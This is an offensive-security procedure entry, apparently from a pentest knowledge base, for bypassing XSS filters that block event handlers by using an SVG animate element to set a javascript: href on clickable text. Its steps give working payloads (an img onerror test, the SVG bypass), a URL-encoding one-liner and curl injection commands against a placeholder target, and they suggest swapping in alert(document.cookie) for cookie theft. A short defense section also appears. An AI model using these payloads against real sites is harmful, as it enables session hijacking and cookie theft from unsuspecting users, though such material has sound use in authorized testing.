---
id: bb703daa-6708-4072-adcd-67b5d5082d98
name: Reflected-XSS-Bypass-Using-SVG-Click-Handler
type: procedure
verified: true
submitted: true
created_at: '2020-08-27T07:57:40.198611+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - '[[tags/injection]]'
  - '[[tags/owasp top 10]]'
  - '[[tags/Reflected XSS]]'
  - '[[tags/Web Applications]]'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
commands:
  - '[[commands/url-encode-xss-payload]]'
  - '[[commands/curl-reflected-xss-injection]]'
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Reflected-XSS-Bypass-Using-SVG-Click-Handler

## Summary

This procedure demonstrates how to bypass web application filters that block common XSS event handlers (e.g., onerror) and href attributes by using an SVG element with an animate tag to set a javascript: URL, creating a clickable text button that executes JavaScript upon interaction. It targets reflected XSS vulnerabilities in search parameters or similar input fields, allowing an attacker to steal cookies or perform other client-side actions in the victim's browser.

## Description

Many web applications implement basic WAF rules or input sanitization to block direct event handler attributes like onerror or onload and javascript: schemes in hrefs to prevent straightforward XSS attacks. This bypass leverages SVG's animate element to dynamically set the href attribute of an anchor tag to a javascript:alert(1) URL after the DOM loads, rendering a 'Click me' text that, when clicked, triggers the JavaScript execution. The payload is reflected via a URL parameter (e.g., ?search=), URL-encoded to evade basic filters, and requires user interaction for execution, making it suitable for reflected scenarios like phishing links. This technique is effective against applications using partial filtering, such as those blocking <script> tags or direct JS but not SVG animations. Expected outcomes include successful JS execution (e.g., alert popup) confirming the bypass, potentially leading to session hijacking via document.cookie theft.

## Requirements

1. A web application with a reflected XSS vulnerability in a parameter like 'search' that echoes user input without full sanitization.
2. Filters in place that block event handlers (e.g., onerror, onload) and javascript: in href attributes.
3. Access to a browser or tool like curl for testing the injection.
4. Basic knowledge of URL encoding to prepare the payload.
5. Target must support SVG rendering (most modern browsers do).

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) with 'unsafe-inline' restricted and no 'unsafe-eval' to block inline JS execution.
- Use comprehensive input validation and sanitization libraries (e.g., DOMPurify) to strip or escape SVG and animate attributes.
- Deploy WAF rules to detect and block SVG-based payloads, including animate with href values.
- Enable client-side logging for unusual SVG rendering or click events on dynamic elements.
- Monitor for reflected parameters containing encoded SVG or javascript: schemes in access logs.

## Objectives

1. Confirm the presence of reflected XSS by testing a blocked standard payload.
2. Bypass filters using SVG animate to create an interactive JS executor.
3. Achieve JavaScript execution in the victim's context to demonstrate impact (e.g., alert or cookie theft).
4. Validate the bypass without relying on auto-executing attributes.

## Instructions

### Step 1: Test Standard XSS Payload

**Context**: First, attempt a common reflected XSS payload to confirm the vulnerability exists but is filtered for event handlers.

Inject the following payload into the vulnerable parameter (e.g., search field):

< img src=1 onerror=alert(document.cookie) >

Use [[commands/curl-reflected-xss-injection]] to send it:

```bash
curl "https://target.com/?search=%3Cimg%20src%3D1%20onerror%3Dalert(document.cookie)%3E" -v
```

> This step verifies the reflection point and observes the block (e.g., no alert, or payload stripped in response).

### Step 2: Observe Filtering Behavior

**Context**: Inspect the application's response to understand the blocking mechanism, ensuring event handlers are neutralized.

View the page source or use browser dev tools after injection. Look for the payload being reflected but with onerror removed or escaped.

Expected: The img tag appears but does not execute JS on load error.

### Step 3: Craft SVG Bypass Payload

**Context**: Create the advanced payload using SVG to animate an href to javascript: code, embedding clickable text.

Use the following payload from [[codes/SVG-Click-Bypass-XSS-Payload]]:

```html
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a></svg>
```

This renders a clickable 'Click me' that sets the link to execute alert(1) on click.

### Step 4: URL Encode the Payload

**Context**: Encode the SVG payload to safely inject it via URL without breaking the request.

Execute [[commands/url-encode-xss-payload]] with the raw payload:

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a></svg>'))"
```

Expected Output: A URL-encoded string like %3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3Dhref%20values%3Djavascript%3Aalert(1)%2F%3E%3Ctext%20x%3D20%20y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E

### Step 5: Inject Encoded Payload

**Context**: Send the encoded payload to the vulnerable endpoint to reflect the SVG element.

Use [[commands/curl-reflected-xss-injection]] with the encoded string:

```bash
curl "https://target.com/?search=%3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3Dhref%20values%3Djavascript%3Aalert(1)%2F%3E%3Ctext%20x%3D20%20y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E" -v
```

Visit the URL in a browser to render the page.

Expected: The page displays 'Click me' text rendered via SVG.

### Step 6: Trigger Execution

**Context**: Interact with the reflected element to execute the JavaScript.

Click on the 'Click me' text in the browser.

Expected Output: An alert box pops up with '1' (or modify to alert(document.cookie) for cookie theft).

**Success Indicators**:
- Alert executes without errors.
- No filtering removes the animate or javascript: values.
- Payload reflects intact in the DOM (inspect element).
